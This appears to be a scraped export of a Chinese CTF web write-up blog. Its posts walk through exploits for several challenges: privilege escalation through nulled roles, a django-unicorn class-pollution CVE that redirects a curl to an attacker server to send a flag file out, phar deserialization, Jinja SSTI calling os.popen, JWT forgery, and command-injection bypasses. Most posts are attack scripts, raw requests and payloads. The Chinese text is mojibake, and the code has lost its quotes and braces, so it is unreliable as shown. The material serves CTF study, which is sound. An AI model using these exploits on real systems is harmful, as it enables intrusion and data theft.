current_attrs.copy() for key in new_attrs: if key in current_attrs: temp_attrs[key] = None cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(temp_attrs), user_id)) db.commit() sanitized_attrs = for key, value in new_attrs.items(): if key in ALLOWED_ATTRIBUTES: if not has_xss(value): sanitized_attrs[key] = value cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) final_attrs = current_attrs.copy() for key, value in sanitized_attrs.items(): final_attrs[key] = value final_attrs[role] = user cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(final_attrs), user_id)) db.commit() db.close() return jsonify(message: Settings updated successfully) except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/manage/permissions, methods=[POST])@requires_authdef manage_permissions(): try: user_id = session[user_id] data = request.get_json() if not data or target_user not in data or new_role not in data: return jsonify(error: Missing required fields), 400 target_username = data[target_user] new_role = data[new_role] db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) user_data = cursor.fetchone() current_user_attrs = json.loads(user_data[attributes]) if current_user_attrs.get(role) != user: cursor.execute(SELECT id, attributes FROM users WHERE username = ?, (target_username,)) target_user = cursor.fetchone() if not target_user: db.close() return jsonify(error: Target user not found), 404 target_attrs = json.loads(target_user[attributes]) target_attrs[role] = new_role cursor.execute(UPDATE users SET attributes = ? WHERE username = ?, (json.dumps(target_attrs), target_username)) db.commit() db.close() return jsonify(message: Permissions updated successfully) db.close() return jsonify(error: Access denied), 403 except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/admin, methods=[GET])@requires_authdef admin_panel(): try: user_id = session[user_id] db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) user_data = cursor.fetchone() db.close() attrs = json.loads(user_data[attributes]) if attrs.get(role) == admin: return jsonify( message: Welcome to the admin panel, flag: os.getenv(FLAG, cubeexample_flag) ) return jsonify(error: Access denied), 403 except sqlite3.Error: return jsonify(error: Server error), 500@app.get(/admin)def admin(): if session.get(user_id): return render_template(admin.html) return redirect(url_for(index))@app.get(/login)def login(): return render_template(login.html)@app.get(/register)def register(): return render_template(register.html)@app.get(/)def index(): if session.get(user_id): db = get_db() cursor = db.cursor() cursor.execute(SELECT username, attributes FROM users WHERE id = ?, (session[user_id],)) user = cursor.fetchone() db.close() return render_template(home.html, user=user[0], attributes=json.loads(user[1]), allowed_attrs=ALLOWED_ATTRIBUTES) return render_template(index.html)init_db() æœ€ä¸»è¦æ˜¯apisettingsupdate è¿™é‡Œæœ‰å¯ä»¥åˆ©ç”¨çš„çš„ä¸œè¥¿ æ¥å£å…ˆæäº¤æ¸…ç©ºå­—æ®µçš„æ•°æ®åº“æ›´æ–°ï¼Œå†å¤„ç†å¹¶æ ¡éªŒè¾“å…¥ï¼Œå½“è¾“å…¥ç±»å‹å¼‚å¸¸å¯¼è‡´åç»­é€»è¾‘ä¸­æ–­æ—¶ï¼Œæ•æ„Ÿå­—æ®µï¼ˆå¦‚ roleï¼‰è¢«æ°¸ä¹…æ¸…ç©ºè€Œæœªæ¢å¤ï¼Œè§¦å‘æƒé™æ£€æŸ¥é€»è¾‘ç¼ºé™·ã€‚æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥[â€œroleâ€] å°±æˆåŠŸè®¾ç½®roleä¸ºnone @app.route(/api/settings/update, methods=[POST])@requires_authdef update_settings(): try: user_id = session[user_id] new_attrs = request.get_json() if not new_attrs: return jsonify(error: Invalid input), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) temp_attrs = current_attrs.copy() for key in new_attrs: if key in current_attrs: temp_attrs[key] = None cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(temp_attrs), user_id)) db.commit() sanitized_attrs = for key, value in new_attrs.items(): if key in ALLOWED_ATTRIBUTES: if not has_xss(value): sanitized_attrs[key] = value cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) final_attrs = current_attrs.copy() for key, value in sanitized_attrs.items(): final_attrs[key] = value final_attrs[role] = user cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(final_attrs), user_id)) db.commit() db.close() return jsonify(message: Settings updated successfully) except sqlite3.Error: return jsonify(error: Server error), 500 å› ä¸ºapimanagepermissionsåªæ ¡éªŒæ˜¯ä¸æ˜¯ä¸ºuser ä¸æ˜¯userå°±é€šè¿‡ æˆ‘ä»¬none æ‰€ä»¥å¯ä»¥é€šè¿‡ä¼ªé€ admin if current_user_attrs.get(role) != user: cursor.execute(SELECT id, attributes FROM users WHERE username = ?, (target_username,)) target_user = cursor.fetchone() äºæ˜¯è„šæœ¬æ˜¯: import requestsBASE = http://gz.imxbt.cn:20580/s = requests.Session()s.post(BASE + /api/register, json= username: sauy, password: 122)s.post(BASE + /api/login, json= username: sauy, password: 122)r = s.post( BASE + /api/settings/update, json=[role], headers=Content-Type: application/json)print(Step 3 status:, r.status_code)r = s.post(BASE + /api/manage/permissions, json= target_user: sauy, new_role: admin)print(Step 4 promote:, r.status_code, r.json())r = s.get(BASE + /api/admin)print(Step 5 flag:, r.status_code, r.json()) legal snacksé¢˜ç›®æè¿°(ä¸­æ–‡ç‰ˆ) æˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªåˆæ³•çš„ç½‘ç«™ï¼Œå®ƒæ­£åœ¨é”€å”®ä¸é»‘å®¢ç›¸å…³çš„é›¶é£Ÿï¼Œä½†å®ƒä»¬çš„ä¸€æ¬¾äº§å“å®šä»·å¥‡æ€ªã€‚æ‰¾å‡ºä¸€ç§æ–¹æ³•åœ¨ä¸æ”¯ä»˜çš„æƒ…å†µä¸‹è´­ä¹°å®ƒã€‚ è¿›å»å°±æ˜¯ä¸€ä¸ªç±»ä¼¼äºè´­ç‰©ç½‘ç«™çš„ä¸œè¥¿ å¾€ä¸‹çœ‹çœ‹çš„ä¸ªä»·æ ¼å¾ˆç¦»è°±çš„ä¸œè¥¿ è‚¯å®šå°±æ˜¯è¦ä¹°å®ƒ ä½™é¢åªæœ‰100 é‚£å°±æƒ³åŠæ³•èƒ½ä¸èƒ½æŠŠè´­ä¹°æ•°é‡æ”¹ä¸ºè´Ÿæ•° å‰ç«¯ç›´æ¥æ”¹ä¸è¡Œ æŠ“ä¸ªåŒ…çœ‹çœ‹å‘¢ æˆåŠŸ é‚£å°±å‡‘åˆ°ä¸è¶…è¿‡100å°±è¡Œäº† æ»¡è¶³è¦æ±‚åè´­ä¹° å¡å·è¦æ±‚16ä½å…¨æ•°å­— todoå…¶ä»–çš„æˆ‘ä¸å•°å—¦äº† å‰é¢çš„ä¹Ÿå°±æ˜¯è¾“å…¥å­—ç¬¦é™åˆ¶20ä¸ªå­—ç¬¦ æŠ“åŒ…çœ‹ä¸ªä¼ å…¥æ ¼å¼ä¸º id:7jqvVCJD,data:task:,tasks:[],checksum:Scdr22XG,actionQueue:[type:syncInput,payload:name:task,value:test1,partials:[],type:callMethod,payload:name:add,partials:[]],epoch:1753276792384,hash:3667ovLi æœ¬é¢˜å¯çŸ¥æ˜¯djangoæ¡†æ¶ è€ƒç‚¹æ˜¯CVE-2025-24370 https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43 é™„ä»¶é‡Œé¢å¾ˆé‡è¦çš„æºç  å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹ settings.CONTACT_URLï¼ˆä¾‹å¦‚é€šè¿‡åºåˆ—åŒ–æ³¨å…¥ã€é…ç½®ä¿®æ”¹ã€æ•°æ®åº“æ³¨å…¥ç­‰ï¼‰ï¼Œå°±èƒ½å°† curl çš„ç›®æ ‡æŒ‡å‘æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ã€‚ def home(request): # todo charge users $49.99/month because greed # todo dont send the confidential flag ... system(fcurl settings.CONTACT_URL -d @/tmp/flag.txt -X GET -o /dev/null) return render(request, findex.html) pocæ˜¯ type: syncInput, payload: name: __init__.__globals__.sys.modules.django.template.backends.django.settings.CONTACT_URL, value: http://your-ip:port æœ€åå‘åŒ… POST /unicorn/message/todo HTTP/1.1Host: gz.imxbt.cn:20622Content-Length: 691Accept: application/jsonX-Requested-With: XMLHttpRequestX-CSRFTOKEN: OaW6pVSwc7zWaWovIsxPogO3TESlFCY0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Content-Type: text/plain;charset=UTF-8Origin: http://gz.imxbt.cn:20622Referer: http://gz.imxbt.cn:20622/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0Connection: close id: n6m7PYbo, data: task: , tasks: [] , checksum: PXafcTdS, actionQueue: [ type: syncInput, payload: name: task, value: 12 , partials: [] , type: syncInput, payload: name: __init__.__globals__.sys.modules.django.template.backends.django.settings.CONTACT_URL, value: http://123:123 , partials: [] , type: callMethod, payload: name: add , partials: [] ], epoch: 1753284343529, hash: djXgQjG4 å…ˆæœåŠ¡å™¨å¼€å§‹ç›‘å¬ ç„¶åå‘åŒ… å†å»ç½‘é¡µåˆ·æ–°å°±å¯ä»¥æ‹¿åˆ°flagäº†","tags":["CTF-wp"]},{"title":"å…³äºgcå›æ”¶æœºåˆ¶åœ¨pharåºåˆ—åŒ–çš„ä¸€æ¬¡ä¾‹é¢˜","path":"/2025/07/22/NSSCTF prize_p1/","content":"NSSCTF prize_p1META http-equiv=Content-Type content=text/html; charset=utf-8 /?phphighlight_file(__FILE__);class getflag function __destruct() echo getenv(FLAG); class A public $config; function __destruct() if ($this-config == w) $data = $_POST[0]; if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $data)) die(æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚); file_put_contents(./tmp/a.txt, $data); else if ($this-config == r) $data = $_POST[0]; if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $data)) die(æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚); echo file_get_contents($data); if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $_GET[0])) die(æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚);unserialize($_GET[0]);throw new Error(é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§); æ€è·¯åˆ†æ:æœ‰ä¸¤ä¸ªç±» Aæ˜¯è¯»å–flag Bæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å†™çš„åŠŸèƒ½ é‚£æˆ‘ä»¬é€šè¿‡ä¸Šä¼ pharæ–‡ä»¶å†åˆ©ç”¨pharåè®®æ¥è¯»å– ä½†æ˜¯pharæ–‡ä»¶æ˜¯æ˜æ–‡ å«æœ‰getflagä¹Ÿä¼šè¢«è¿‡æ»¤ é‚£å°±ä½¿ç”¨gzipæ‰“åŒ… pharä¼ªåè®®ä¸€æ ·å¯ä»¥è§£ægzip bzip2 tar zipè¿™å››ä¸ªåç¼€çš„æ–‡ä»¶ ç”Ÿæˆpharæ–‡ä»¶è®°å¾—phar onlyè®¾ç½®ä¸ºoff å¹¶ä¸”è¿™é‡Œphpç¯å¢ƒä½¿ç”¨çš„å’Œé¢˜ç›®ç¯å¢ƒä¸€æ ·çš„php5 ?phphighlight_file(__FILE__); class getflag $phar = new Phar(test.phar);$phar-startBuffering();$phar-setStub(?php __HALT_COMPILER(); ?);$o = new getflag();$o = array(0=$o,1=null);$phar-setMetadata($o);$phar-addFromString(test.txt, test);$phar-stopBuffering(); é‚£ä¹ˆè¿™é‡Œç”Ÿæˆçš„pharæ–‡ä»¶æˆ‘ä»¬éœ€è¦ç»•è¿‡throw new Error(â€œé‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§â€); è¿™é‡Œå°±è¿ç”¨åˆ°äº†gcå›æ”¶æœºåˆ¶ ä¿®æ”¹pharæ–‡ä»¶ å°†1æ›¿æ¢ä¸º0 a:2:i:0;O:7:getflag:i:0;N; Array[0]é¦–å…ˆæ˜¯è®¾ç½®ä¸ºgetflagå¯¹è±¡çš„ï¼Œç„¶ååˆå°†Array[0]èµ‹å€¼ä¸ºNuLLï¼Œé‚£ä¹ˆåŸæ¥çš„getflagå°±æ²¡æœ‰è¢«å¼•ç”¨äº† è§¦å‘äº†gcå›æ”¶æœºåˆ¶ __destructè¢«æå‰è§¦å‘ é‡æ–°ç­¾åä¿®æ”¹è¿‡åçš„pharæ–‡ä»¶éœ€è¦é‡æ–°ç­¾å from hashlib import sha1f = open(./test.phar, rb).read() # ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®h = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†newf = s+sha1(s).digest()+h # æ•°æ® + ç­¾å + ç±»å‹ + GBMBopen(ph2.phar, wb).write(newf) # å†™å…¥æ–°æ–‡ä»¶ è¯»å–flagç„¶åä¸Šä¼ æ–‡ä»¶è¿›è¡Œè¯»å–æ“ä½œ import requestsimport reimport gzipurl = http://node4.anna.nssctf.cn:28318/### å…ˆå°†pharæ–‡ä»¶å˜æˆgzipæ–‡ä»¶with open(./ph2.phar, rb) as f1: phar_zip = gzip.open(gzip.zip, wb) # åˆ›å»ºäº†ä¸€ä¸ªgzipæ–‡ä»¶çš„å¯¹è±¡ phar_zip.writelines(f1) # å°†pharæ–‡ä»¶çš„äºŒè¿›åˆ¶æµå†™å…¥ phar_zip.close()###å†™å…¥gzipæ–‡ä»¶with open(gzip.zip, rb) as f2: data1 = 0: f2.read() # åˆ©ç”¨gzipåå…¨æ˜¯ä¹±ç ç»•è¿‡ param1 = 0: O:1:A:1:s:6:config;s:1:w; p1 = requests.post(url=url, params=param1, data=data1)### è¯»gzip.zipæ–‡ä»¶ï¼Œè·å–flagparam2 = 0: O:1:A:1:s:6:config;s:1:r;data2 = 0: phar://tmp/a.txtp2 = requests.post(url=url, params=param2, data=data2)flag = re.compile(NSSCTF\\.*?\\).findall(p2.text)print(flag)","tags":["CTF-wp"]},{"title":"Basectf2024-web","path":"/2025/07/09/BaseCTF2024-WEB/","content":"æ•°å­¦å¤§å¸ˆç»å…¸requestè„šæœ¬é¢˜ æ­£åˆ™aiå°±è¡Œ æ³¨æ„ç‚¹å°±æ˜¯æŠŠÃ—æ›¿æ¢ä¸º* Ã·æ›¿æ¢ä¸º å¹¶ä¸”å¼€å¯session cookie å› ä¸ºåˆ¤æ–­è¿ç»­æ­£ç¡®ä¾é cookie import reimport requestsurl = http://gz.imxbt.cn:20429/sess=requests.session()sess.cookies.set(PHPSESSID, d5nu0bl94l91naj2i7heme44vu)response = sess.get(url)count = 0for i in range(50): match = re.search(r(\\d+)\\s*([+\\-\\*/Ã—Ã·])\\s*(\\d+), response.text) a, op, b = match.groups() if op == Ã—: op = * if op == Ã·: op = // expr = faopb answer = eval(expr) print(fç¬¬i + 1é¢˜: expr = answer) response = sess.post(url, data=answer: str(answer)) count += 1 if count == 50: print(response.text) flag:BaseCTFf93114a9-c1ea-41a7-b05a-d2bb8e32a9ed ç©åŸç¥ç©çš„phpå®¡è®¡é¢˜ ?phphighlight_file(__FILE__);error_reporting(0);include flag.php;if (sizeof($_POST[len]) == sizeof($array)) ys_open($_GET[tip]); else die(é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ);function ys_open($tip) if ($tip != æˆ‘è¦ç©åŸç¥) die(æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­); dumpFlag();function dumpFlag() if (!isset($_POST[m]) || sizeof($_POST[m]) != 2) die(å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡); $a = $_POST[m][0]; $b = $_POST[m][1]; if(empty($a) || empty($b) || $a != 100% || $b != love100% . md5($a)) die(æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡); include flag.php; $flag[] = array(); for ($ii = 0;$ii sizeof($array);$ii++) $flag[$ii] = md5(ord($array[$ii]) ^ $ii); echo json_encode($flag); ç¬¬ä¸€æ­¥å°±æ˜¯æ¯”è¾ƒlenæ•°ç»„çš„é•¿åº¦æ˜¯å¦å’Œflagçš„é•¿åº¦ç›¸åŒï¼Œçˆ†ç ´å³å¯ä¼ å‚ GET:?tip=æˆ‘è¦ç©åŸç¥ POST:len[0]=1len[1]=1len[2]=1len[3]=1len[4]=1len[5]=1len[6]=1len[7]=1len[8]=1len[9]=1len[10]=1len[11]=1len[12]=1len[13]=1len[14]=1len[15]=1len[16]=1len[17]=1len[18]=1len[19]=1len[20]=1len[21]=1len[22]=1len[23]=1len[24]=1len[25]=1len[26]=1len[27]=1len[28]=1len[29]=1len[30]=1len[31]=1len[32]=1len[33]=1len[34]=1len[35]=1len[36]=1len[37]=1len[38]=1len[39]=1len[40]=1len[41]=1len[42]=1len[43]=1len[44]=1 ç¬¬äºŒæ­¥å¾ˆç®€å•å­—é¢æ„æ€ GETä¸å˜ POST:len[0]=1len[1]=1len[2]=1len[3]=1len[4]=1len[5]=1len[6]=1len[7]=1len[8]=1len[9]=1len[10]=1len[11]=1len[12]=1len[13]=1len[14]=1len[15]=1len[16]=1len[17]=1len[18]=1len[19]=1len[20]=1len[21]=1len[22]=1len[23]=1len[24]=1len[25]=1len[26]=1len[27]=1len[28]=1len[29]=1len[30]=1len[31]=1len[32]=1len[33]=1len[34]=1len[35]=1len[36]=1len[37]=1len[38]=1len[39]=1len[40]=1len[41]=1len[42]=1len[43]=1len[44]=1m[0]=100%25m[1]=love100%2530bd7ce7de206924302499f197c7a966 %è®°å¾—urlç¼–ç  å¾—åˆ°åˆ—è¡¨ æœ€åä¸€æ­¥aiç»™ä½ å†™ä¸ªè¿˜åŸè„šæœ¬å°±å¥½ import hashlibmd5_list = [ 3295c76acbf4caaed33c36b1b5fc2cb1,26657d5ff9020d2abefe558796b99584,73278a4a86960eeb576a8fd4c9ec6997, ec8956637a99787bd197eacd77acce5e,e2c420d928d4bf8ce0ff2ec19b371514,43ec517d68b6edd3015b3edc9a11367b, ea5d2f1c4608232e07d3aa3d998e5135,c8ffe9a587b126f152ed3d89a146b445,2723d092b63885e0d7c260cc007e8b9d, 2723d092b63885e0d7c260cc007e8b9d,c9e1074f5b3f9fc8ea15d152add07294,c9e1074f5b3f9fc8ea15d152add07294, f0935e4cd5920aa6c7c996a5ee53a70f,65b9eea6e1cc6bb9f0cd2a47751a186f,03afdbd66e7929b125f8597834fa83a4, 44f683a84163b3523afe57c2e008bc8c,7f39f8317fbdb1988ef4c628eba02591,d67d8ab4f4c10bf22aa353e27879133c, 6364d3f0f495b6ab9dcf8d3b5c6e0b01,a5771bce93e200c36f7cd9dfd0e5deaa,6c8349cc7260ae62e3b1396831a8398f, 9f61408e3afb633e50cdf1b20de6f466,e369853df766fa44e1ed0ff613f563bd,d67d8ab4f4c10bf22aa353e27879133c, a0a080f42e6f13b3a2df133f073095dd,c8ffe9a587b126f152ed3d89a146b445,b53b3a3d6ab90ce0268229151c9bde11, e369853df766fa44e1ed0ff613f563bd,6c8349cc7260ae62e3b1396831a8398f,4c56ff4ce4aaf9573aa5dff913df997a, d645920e395fedad7bbbed0eca3fe2e0,c0c7c76d30bd3dcaefc96f40275bdc0a,1ff1de774005f8da13f42943881c655f, 8e296a067a37563370ded05f5a3bf3ec,7cbbc409ec990f19c78c75bd1e06f215,6f4922f45568161a8cdf4ad2299f6d23, 1f0e3dad99908345f7439f8ffabdffc4,a3f390d88e4c41f2747bfa2f1b5f87db,3295c76acbf4caaed33c36b1b5fc2cb1, 735b90b4568125ed6c3f678819b6e058,c74d97b01eae257e44aa9d5bade97baf,6ea9ab1baa0efb9e19094440c317e21b, 4e732ced3463d06de0ca9a15b6153677,33e75ff09dd601bbe69f351039152189,43ec517d68b6edd3015b3edc9a11367b]def md5_str(s: str) - str: return hashlib.md5(s.encode()).hexdigest()flag_chars = []for i, target_md5 in enumerate(md5_list): found = False for c in range(32, 127): # å¸¸è§å¯æ‰“å°å­—ç¬¦ASCIIèŒƒå›´ val = c ^ i val_str = str(val) if md5_str(val_str) == target_md5: flag_chars.append(chr(c)) found = True break if not found: flag_chars.append(?)flag = .join(flag_chars)print(è¿˜åŸçš„flag:, flag) flag:BaseCTFedbcfd11-6259-40be-91d6-88d17add8407 1z_php?phphighlight_file(index.php);# æˆ‘è®°å¾—å¥¹...å¥½åƒå«flag.phpå§ï¼Ÿ$emp=$_GET[e_m.p];$try=$_POST[try];if($emp!=114514intval($emp,0)===114514) for ($i=0;$istrlen($emp);$i++) if (ctype_alpha($emp[$i])) die(ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼); echo åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼.br; if (preg_match(/.+?HACKER/is,$try)) die(ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ); if (!stripos($try,HACKER) === TRUE) die(ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ); $a=$_GET[a]; $b=$_GET[b]; $c=$_GET[c]; if(stripos($b,php)!==0) die(æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼); echo (new $a($b))-$c();else die(114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ);# è§‰å¾—å›°éš¾çš„è¯å°±ç›´æ¥æŠŠshellæ‹¿å»ç”¨å§ï¼Œä¸ç”¨è°¢~$shell=$_POST[shell];eval($shell);? ç¬¬ä¸€ä¸ªintvalç‰¹æ€§ ,ä¼ å‚è¿˜è€ƒäº†ä¸€ä¸ªphpéæ³•ä¼ å‚,e[m.p=114514,å³å¯ ç¬¬äºŒæ­¥ ç»•è¿‡æ­£åˆ™å¹¶ä¸”ä¸æ»¡è¶³!stripos($try,HACKER) === TRUE,å½“æˆ‘ä»¬ä¼ å…¥tryHACKERçš„æ—¶å€™ï¼Œä¼šè¾“å‡ºä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ ç»•ä¸è¿‡ ä½¿ç”¨æœ€å¤§æ­£åˆ™å›æº¯ æœ€å (new $a($b))-$c() å¾ˆæ˜æ˜¾çš„phpä½¿ç”¨åŸç”Ÿç±»è¯»æ–‡ä»¶ import requestsurl = (http://gz.imxbt.cn:20693/ ?e[m.p=114514.1 a=SplFileObject b=php://filter/read=convert.base64-encode/resource=flag.php c=__toString)data = try: f * 1000001 + HACKERres = requests.post(url=url, data=data)print(res.text) flag:BaseCTF07e8680b-b866-4d95-a053-20f723b24c06 A Dark Roomç­¾åˆ°é¢˜ ctrl+uå³å¾— Aura é…±çš„ç¤¼ç‰©ç®€å•çš„ä¼ªåè®®å’Œssrfç»•è¿‡ POSTï¼špen=data://text/plain,Aurachallenge=http://jasmineaura.github.io@127.0.0.1gift=php://filter/convert.base64-encode/resource=flag.php flag:BaseCTFe996ff9f-4941-4247-a168-e9aa94e6fd8b Back to the futureè¿›å»éƒ½æ²¡æœ‰ çœ‹çœ‹æœ‰æ— robots.txt æœ‰ User-agent: *Disallow: /.git ç›´ç™½çš„gitæ³„éœ² ä½¿ç”¨git-dumper https://github.com/arthaud/git-dumper python3 git_dumper.py http://gz.imxbt.cn:20805/.git/ ./basectf æ‹‰ä¸‹æ¥å‘ç°åªæœ‰ä¸€ä¸ªREADME.md,å†…å®¹æ˜¯ # My WebsiteThis is my web project.Oops, I place flag here, but i deleted it! äºæ˜¯æˆ‘ä»¬å»æŸ¥çœ‹log å³å¯å¾—åˆ°flag flag:BaseCTF1aa62024-5a12-4f55-80fa-cb9c41e1154b HTTP æ˜¯ä»€ä¹ˆå‘€ç­¾åˆ°é¢˜ POST /?basectf=we1c%2500me HTTP/1.1Host: gz.imxbt.cn:20807Content-Type: application/x-www-form-urlencodedUser-Agent: BaseCookie: c00k13=i cant eat itReferer: BaseX-Forwarded-For: 127.0.0.1Base=fl@g ç„¶åæœ‰ä¸€ä¸ªé‡å®šå‘,æŠ“è·³è½¬ä¸€ç¬é—´çš„åŒ…å°±è¡Œï¼Œresponseé‡Œæœ‰flagçš„base64ç¼–ç  Jinja Marké¦–å…ˆè¿›å…¥ç•Œé¢æç¤ºäº†indexå’Œflagè·¯ç”± flagè·¯ç”±è¿›å»çŒœå¹¸è¿æ•°å­— çˆ†ç ´å°±è¡Œ å¯ä»¥å¾—åˆ°éƒ¨åˆ†æºç  BLACKLIST_IN_index = [,]def merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)@app.route(/magic,methods=[POST, GET])def pollute(): if request.method == POST: if request.is_json: merge(json.loads(request.data), instance) return è¿™ä¸ªé­”æœ¯è¿˜è¡Œå§ else: return æˆ‘è¦jsonçš„é­”æœ¯ return è®°å¾—ç”¨POSTæ–¹æ³•æŠŠé­”æœ¯äº¤ä¸Šæ¥ sstiç¦æ­¢äº†{å’Œ}ï¼Œå°±è¿™ç‚¹æ¥è¯´ä¸èƒ½è¿›è¡Œsstiäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªmagicè·¯å¾„æ²¡ç”¨ï¼Œåœ¨magicè·¯ç”±ä¸‹æ±¡æŸ“jinjaçš„è¯­æ³•æ ‡è¯†ç¬¦ __init__ : __globals__ : app : jinja_env :variable_start_string : ,variable_end_string: å†åœ¨indexè·¯å¾„ä¸‹è¿›è¡Œæ­£å¸¸çš„sstiæ³¨å…¥å°±å¯ lipsum.__globals__.__builtins__.__import__(os).popen(cat /flag).read() flag:BaseCTF5e4b7b9a-ce09-49f0-8e43-4efca0964ebd No JWTç»™äº†æºç  from flask import Flask, request, jsonifyimport jwtimport datetimeimport osimport randomimport stringapp = Flask(__name__)# éšæœºç”Ÿæˆ secret_keyapp.secret_key = .join(random.choices(string.ascii_letters + string.digits, k=16))# ç™»å½•æ¥å£@app.route(/login, methods=[POST])def login(): data = request.json username = data.get(username) password = data.get(password) # å…¶ä»–ç”¨æˆ·éƒ½ç»™äºˆ user æƒé™ token = jwt.encode( sub: username, role: user, # æ™®é€šç”¨æˆ·è§’è‰² exp: datetime.datetime.utcnow() + datetime.timedelta(hours=1) , app.secret_key, algorithm=HS256) return jsonify(token: token), 200# flag æ¥å£@app.route(/flag, methods=[GET])def flag(): token = request.headers.get(Authorization) if token: try: decoded = jwt.decode(token.split( )[1], options=verify_signature: False, verify_exp: False) # æ£€æŸ¥ç”¨æˆ·è§’è‰²æ˜¯å¦ä¸º admin if decoded.get(role) == admin: with open(/flag, r) as f: flag_content = f.read() return jsonify(flag: flag_content), 200 else: return jsonify(message: Access denied: admin only), 403 except FileNotFoundError: return jsonify(message: Flag file not found), 404 except jwt.ExpiredSignatureError: return jsonify(message: Token has expired), 401 except jwt.InvalidTokenError: return jsonify(message: Invalid token), 401 return jsonify(message: Token is missing), 401if __name__ == __main__: app.run(debug=True) ä¸€çœ¼JWTä¼ªé€ ï¼Œé¦–å…ˆå»loginæ‹¿åˆ°åŸå§‹token æ‰¾ä¸€ä¸ªç½‘ç«™https://www.bejson.com/jwt/ å°†roleæ”¹ä¸ºadminå³å¯ GET /flag HTTP/1.1Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXV5Iiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzUyNDgzMDc3fQ.T9JaxnAd3WpQucobpUiDPYl52FqfnNiZ7frMu-rCrSs flag:BaseCTFd1d644ea-e932-4db8-a1df-e7be8b450e0d RCEisamazingwithspaceç®€å•çš„RCEç»•è¿‡ç©ºæ ¼ ${IFS} POST:cmd=cat$IFS/flag flag:BaseCTF50ef1244-a571-48dc-84f4-0a3cfe832b3c Really EZ POPå¾ˆç®€å•çš„popé“¾å­ ?phpclass Sink private $cmd = system(cat /flag);;class Shark private $word; public function __construct() $this - word = new Sink(); class Sea public $animal; public function __construct() $this-animal = new Shark(); class Nature public $sea; public function __construct() $this - sea = new Sea(); $a = new Nature();echo urlencode(serialize($a));? å”¯ä¸€æ³¨æ„å°±æ˜¯privateå±æ€§å¤–éƒ¨ä¸å¯è°ƒç”¨ only one sql?phphighlight_file(__FILE__);$sql = $_GET[sql];if (preg_match(/select|;|@| /i, $sql)) die(ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥);if (preg_match(/|\\$|`|\\\\\\\\/i, $sql)) die(ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE);//flag in ctf.flag$query = mysql -u root -p123456 -e \\use 